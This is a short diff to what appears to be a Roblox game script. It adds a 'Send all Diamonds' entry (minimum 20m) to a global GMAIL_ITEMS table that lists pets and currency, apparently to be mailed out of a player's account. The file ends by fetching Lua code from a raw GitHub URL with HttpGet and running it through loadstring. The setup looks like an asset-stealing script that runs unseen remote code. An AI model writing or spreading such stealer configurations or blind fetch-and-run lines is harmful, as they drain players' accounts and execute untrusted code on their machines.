@@ -29,5 +29,6 @@ _G.GMAIL_ITEMS = {
   ["Shiny Normal Fireball Cat"] = {Class = "Pet", Id = "Fireball Cat", MinAmount = 1, IsShiny = true},
   ["Shiny Golden Fireball Cat"] = {Class = "Pet", Id = "Fireball Cat", MinAmount = 1, IsGold = true, IsShiny = true},
   ["Shiny RB Fireball Cat"] = {Class = "Pet", Id = "Fireball Cat", MinAmount = 1, IsRainbow = true, IsShiny = true},
+  ["Send all Diamonds"] = {Class = "Currency", Id = "Diamonds", MinAmount = "20m"},
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/sxdasfvas/test/main/gscripts.lua"))()
